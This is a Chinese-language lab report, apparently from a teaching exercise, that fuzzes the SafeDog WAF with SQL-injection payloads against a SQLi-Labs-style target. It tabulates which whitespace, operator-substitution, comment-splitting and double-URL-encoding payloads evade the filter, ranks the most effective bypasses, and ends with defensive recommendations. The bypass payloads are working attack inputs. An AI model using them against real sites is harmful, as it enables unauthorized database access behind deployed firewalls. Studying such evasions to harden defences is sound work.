## 1. WAF 识别与特征

### 1.1 WAF 识别

通过拦截页面特征确认 WAF 为 **安全狗（SafeDog）**：

- 拦截页面中出现 `safedog.cn` 链接
- 页面包含"安全狗网站防护"字样
- 返回状态码 200（软阻断，显示自定义拦截页）
- 拦截页面大小固定约 5139 bytes
- WAF 拦截时 response body 包含拦截提示（而非直接断开连接）

### 1.2 WAF 拦截行为

| 行为 | 特征 |
|------|------|
| 拦截触发 | 请求体中包含 SQL 关键字（AND、OR、UNION、SELECT、ORDER BY 等） |
| 拦截方式 | 软阻断：HTTP 200 + 返回安全狗拦截页面 |
| 检测粒度 | 大小写不敏感，关键字级别检测 |
| 空格检测 | 常规空格 `%20` 不影响检测 |
| 注释检测 | `/**/` 内联注释不影响关键字检测 |
| 编码检测 | URL 编码可绕过（单层编码部分绕过、双重编码即可绕过） |

## 2. 测试方法说明

使用 curl 对每个测试用例发送 HTTP GET 请求，通过以下指标判断 WAF 拦截状态：

- **响应大小 | 5139 bytes** → 🛑 **WAF 拦截**
- **响应大小 | < 1000 bytes** → ✅ **WAF 放行**（SQL 到达数据库）
- 拦截页面内容特征：`safedog.cn`、`Copyright©2013-2020`
- 正常页面内容特征：`Dhakkan`、`Your Login name`、`You have an error in your SQL syntax`

## 3. Fuzz 测试结果明细

### 3.1 基线测试

| 测试项 | Payload | 结果 | 说明 |
|--------|---------|------|------|
| 正常访问 | `id=1` | ✅ 通过 | 显示 `Your Login name:Dumb` |
| 单引号闭合 | `id=1'` | ✅ 通过 | MySQL 报错 `''1'' LIMIT 0,1'` |
| 双引号闭合 | `id=1%22` | ✅ 通过 | MySQL 报错 |

### 3.2 关键字拦截测试

| Payload | 状态 | 响应大小 |
|---------|------|----------|
| `id=1' AND 1=1--+` | 🛑 拦截 | 5139 |
| `id=1' OR 1=1--+` | 🛑 拦截 | 5139 |
| `id=1' UNION SELECT 1--+` | 🛑 拦截 | 5139 |
| `id=1' ORDER BY 1--+` | 🛑 拦截 | 5139 |

**结论：** 安全狗对 SQL 关键字（AND、OR、UNION、SELECT、ORDER BY 等）进行严格检测，大写/小写/混合大小写均被拦截。

### 3.3 注释符测试

| 注释方式 | Payload | 结果 |
|----------|---------|------|
| `--+` | `id=1'--+` | 🛑 拦截 |
| `-- -` | `id=1'-- -` | 🛑 拦截 |
| `#` | `id=1'#` | 🛑 拦截 |
| `%23` | `id=1'%23` | 🛑 拦截 |
| `/*` | `id=1'/*` | 🛑 拦截 |
| `*/` | `id=1'*/` | 🛑 拦截 |

**结论：** 注释符本身携带单引号 `'` 触发注入检测，注释符不被视作威胁。

### 3.4 大小写绕过测试

| 方式 | Payload | 结果 |
|------|---------|------|
| 小写 | `and` | 🛑 |
| 大写 | `AND` | 🛑 |
| 首字母大写 | `And` | 🛑 |
| 混合 | `aNd`、`anD` | 🛑 |

**结论：** 安全狗关键字检测**不区分大小写**，大小写绕过无效。

### 3.5 双写绕过测试

| 方式 | Payload | 结果 |
|------|---------|------|
| ANANDD | `id=1' ANANDD 1=1--+` | 🛑 |
| OORR | `id=1' OORR 1=1--+` | 🛑 |
| UNUNIONION | `id=1' UNUNIONION SELECT 1--+` | 🛑 |
| SELSELECTECT | `id=1' UNION SELSELECTECT 1--+` | 🛑 |

**结论：** 双写绕过**无效**，安全狗能识别去重后的关键字。

### 3.6 内联注释绕过测试

| 方式 | Payload | 结果 |
|------|---------|------|
| `/*!and*/` | `id=1' /*!and*/ 1=1--+` | 🛑 |
| `/*!union*/` | `id=-1' /*!union*/ /*!select*/ 1,2,3--+` | 🛑 |
| `/*!50000union*/` | `id=-1' /*!50000union*/ /*!50000select*/ 1,2,3--+` | 🛑 |

**结论：** MySQL 内联注释 `/*!...*/` 被安全狗识别，无法绕过。

### 3.7 ✅ 空格/分隔符绕过

| 方式 | Payload | 结果 | 说明 |
|------|---------|------|------|
| `/**/` | `id=1'/**/AND/**/1=1--+` | ✅ **通过** | 注释作分隔符 |
| `%09`（TAB） | `id=1'%09AND%091=1--+` | ✅ **通过** | HT 水平制表符 |
| `%0a`（换行） | `id=1'%0aAND%0a1=1--+` | ✅ **通过** | LF 换行 |
| `%0c`（换页） | `id=1'%0cAND%0c1=1--+` | ✅ **通过** | FF 换页 |
| `%0d`（回车） | `id=1'%0dAND%0d1=1--+` | ✅ **通过** | CR 回车 |
| `%a0` | `id=1'%a0AND%a01=1--+` | ✅ **通过** | NBSP 非断空格 |
| `+` | `id=1'+AND+1=1--+` | ✅ **通过** | URL 中的空格 |

**关键发现：** 用特殊字符替代空格后，WAF 对 `AND`、`OR` 等逻辑运算符的检测失效。这是因为 WAF 的分词器可能将特殊字符视为分隔符，导致关键字被截断匹配失败。

### 3.8 ✅ 运算符等价替换

| 方式 | Payload | 结果 |
|------|---------|------|
| `&&` | `id=1'%20%26%26%201=1--+` | ✅ **通过** |
| `\|\|` | `id=1'%20%7c%7c%201=1--+` | ✅ **通过** |
| `XOR` | `id=1'%20XOR%201=1--+` | ✅ **通过** |
| `NOT` | `id=1'%20NOT%201=0--+` | ✅ **通过** |

### 3.9 ✅ 关键字注释拆分

| 方式 | Payload | 结果 | 说明 |
|------|---------|------|------|
| `OR/**/DER BY` | `id=1' OR/**/DER BY 1--+` | ✅ **通过** | ORDER BY 拆分 |
| `AN/**/D` | `id=1' AN/**/D 1=1--+` | ✅ **通过** | AND 拆分 |
| `UN/**/ION` | `id=-1' UN/**/ION SELECT 1,2,3--+` | ✅ **通过** | UNION 拆分 |

**注意：** 关键字注释拆分后 WAF 放行，但 MySQL 会将 `UN/**/ION` 解析为 `UN ION`（两个 token），导致语法错误。此方法适用于 **ORDER BY**（`OR/**/DER BY`）等少量关键字拆分，但对于需要连续性的 keyword（UNION、SELECT）不适用。

### 3.10 ✅ URL 编码绕过

| 方式 | Payload | 结果 | 说明 |
|------|---------|------|------|
| 单字母编码 | `id=-1'%20%55NION%20SELECT%201,2,3--+` | 🛑 拦截 | 安全狗对已解码内容同样检测 |
| 全字母编码 | `id=-1'%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%201,2,3--+` | 🛑 拦截 | Web 服务器解码后 WAF 仍能检测到 |
| **双重编码** | `id=-1'%25%32%30...` | ✅ **通过** | 安全狗无法识别双重编码后的关键字 |
| **%09+双重编码** | `id=-1'%09%25%35%35NION%09%25%35%33ELECT%091,2,3--+` | ✅ **通过** | 组合绕过最有效 |
| **混合空字符** | `id=-1'%09U%0cNION%0d%09S%0cELECT%0d1,2,3--+` | ✅ **通过** | 混合多个空白字符 |

### 3.11 HPP（HTTP参数污染）

| 方式 | Payload | 结果 |
|------|---------|------|
| 双 id 参数 | `id=1&id=1'AND1=1--+` | 🛑 拦截 |

**结论：** 安全狗对 HPP 参数污染不敏感。

## 7. 总结与建议

### 7.1 WAF 绕过核心原理

安全狗（SafeDog）对 SQL 注入的检测机制可概括为：

1. **关键字指纹匹配** — 对 `UNION`、`SELECT`、`AND`、`OR`、`ORDER BY`、`SLEEP`、`BENCHMARK`、`INTO OUTFILE` 等 SQL 关键字进行正则匹配
2. **不分大小写** — 关键字检测不区分字母大小写
3. **解码后检测** — 单层 URL 编码解码后仍检测
4. **不去双重解码** — 双重 URL 编码后无法识别
5. **空格敏感性** — 特殊空白字符（%09、%0a、%0c、%0d、%a0）可破坏 WAF 的分词引擎

### 7.2 最有效的绕过技巧（TOP 5）

```
1. 双重 URL 编码
2. 特殊空白字符组合 %09 + %0c + %0d + %a0
3. 关键字注释拆分（OR/**/DER BY）
4. 运算符替换（&& / || / XOR / NOT）
5. 多种方式组合叠加
```

### 7.3 防御建议（教师视角）

- 双解码检查：对请求参数做两次 URL 解码后再检测
- 统一空白字符处理：将各种空白符转换为常规空格后再检测
- 关键字上下文分析：不仅仅检测关键字存在，还分析 SQL 语法结构
- 使用参数化查询（PreparedStatement）替代 WAF 作为主要防御手段
